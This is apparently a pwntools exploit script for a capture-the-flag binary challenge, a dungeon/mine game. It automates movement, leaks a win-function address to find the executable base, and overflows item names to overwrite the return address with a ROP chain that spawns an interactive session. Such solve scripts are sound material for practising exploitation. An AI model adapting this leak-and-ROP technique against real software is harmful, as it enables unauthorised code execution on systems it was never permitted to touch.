from pwn import *

LOCAL = 0

if LOCAL:
    p = process('../src/chall')
else:
    p = remote('localhost', 9999)

UP, RIGHT, DOWN, LEFT = (1, 2, 3, 4)
MAPROWBOUND, MAPCOLBOUND = (19, 19)
def move(where):
    global position_row, position_col
    p.recvuntil(b'> ')
    p.sendline(str(where).encode())
    if (where == UP):
        position_row -= 1
    if (where == RIGHT):
        position_col += 1
    if (where == DOWN):
        position_row += 1
    if (where == LEFT):
        position_col -= 1

def get_position():
    res = p.recvuntil(b'. ').split(b'\n')
    return int(res[3].split(b', ')[0][16:].decode()), int(res[3].split(b', ')[1][6:].decode())

def goto_zero():
    global position_row, position_col
    while (position_row > 0):
        move(UP)
    while (position_col > 0):
        move(LEFT)

# get more stamina
for i in range(1000):
    p.recvuntil(b'> ')
    p.sendline(b'0')

# enter the mine
p.recvuntil(b'> ')
p.sendline(b'1')

# get current position
position_row, position_col = get_position()

# go to (row, col) = (0, 0)
goto_zero()

# find an item before find the ladder
# if we find a ladder, just terminate and try again
while True:
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil(b'\n')
    res = p.recvuntil(b'\n')
    if (res == b'Nothing here.\n'):
        if (position_col == MAPCOLBOUND):
            while (position_col > 0):
                move(LEFT)
            move(DOWN)
        else:
            move(RIGHT)
    elif (b'ladder' in res):
        print(b'ladder found before item, try again.')
        exit(0)
    else:
        p.recvuntil(b': ')
        p.sendline(b'1')
        p.recvuntil(b': ')
        p.sendline(b'1')
        p.recvuntil(b': ')
        p.sendline(b'A' * 8) # make the level 0

        # move
        if (position_col == MAPCOLBOUND):
            while (position_col > 0):
                move(LEFT)
            move(DOWN)
        else:
            move(RIGHT)
        break

item_cnt = 1
MAX_ITEM_CNT = 13
# find a ladder, get maximum MAX_ITEM_CNT items
while True:
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil(b'\n')
    res = p.recvuntil(b'\n')
    if (res == b'Nothing here.\n'):
        if (position_col == MAPCOLBOUND):
            while (position_col > 0):
                move(LEFT)
            move(DOWN)
        else:
            move(RIGHT)
    elif (b'You find a ladder!\n' == res):
        p.recvuntil(b'> ')
        p.sendline(b'2')
        break
    else:
        p.recvuntil(b': ')
        if (item_cnt < MAX_ITEM_CNT):
            p.sendline(b'1')
            p.recvuntil(b': ')
            p.sendline(b'0')
            item_cnt += 1
        else:
            p.sendline(b'0')

        # move
        if (position_col == MAPCOLBOUND):
            while (position_col > 0):
                move(LEFT)
            move(DOWN)
        else:
            move(RIGHT)

# find the special item (address of win), should not find a ladder
win_addr = 0
win_offset = 0x00000000000009ea
executable_base = 0
pop_rsi_r15 = 0x0000000000001a21
goto_zero()
while True:
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil(b'\n')
    res = p.recvuntil(b'\n')
    if (res == b'Nothing here.\n'):
        if (position_col == MAPCOLBOUND):
            while (position_col > 0):
                move(LEFT)
            move(DOWN)
        else:
            move(RIGHT)
    elif (b'ladder' in res):
        print(b'ladder found before special item, try again.')
        exit(0)
    else:
        win_addr = int(p.recvuntil(b': ').split(b'\n')[1].decode(), 16)
        executable_base = win_addr - win_offset
        p.sendline(b'0')
        # move
        if (position_col == MAPCOLBOUND):
            while (position_col > 0):
                move(LEFT)
            move(DOWN)
        else:
            move(RIGHT)
        break

# get the item which if it thename is set will overwrite return address
# write the address of win to the name
while True:
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil(b'\n')
    res = p.recvuntil(b'\n')
    if (res == b'Nothing here.\n'):
        if (position_col == MAPCOLBOUND):
            while (position_col > 0):
                move(LEFT)
            move(DOWN)
        else:
            move(RIGHT)
    elif (b'ladder' in res):
        print(b'ladder found before special item, try again.')
        exit(0)
    else:
        p.recvuntil(b': ')
        p.sendline(b'1')
        p.recvuntil(b': ')
        item_cnt += 1

        if (item_cnt > MAX_ITEM_CNT):
            p.sendline(b'1')
            p.recvuntil(b': ')
            if (item_cnt == MAX_ITEM_CNT + 1):
                p.sendline(p64(pop_rsi_r15 + executable_base))
            elif (item_cnt == MAX_ITEM_CNT + 2 or item_cnt == MAX_ITEM_CNT + 3):
                p.sendline(p64(0))
            elif (item_cnt == MAX_ITEM_CNT + 4):
                p.sendline(p64(win_addr))
                p.recvuntil(b'> ')
                p.sendline(b'5')
                p.interactive()
                exit(0)
        else:
            p.sendline(b'0')
            item_cnt += 1

        # move
        if (position_col == MAPCOLBOUND):
            while (position_col > 0):
                move(LEFT)
            move(DOWN)
        else:
            move(RIGHT)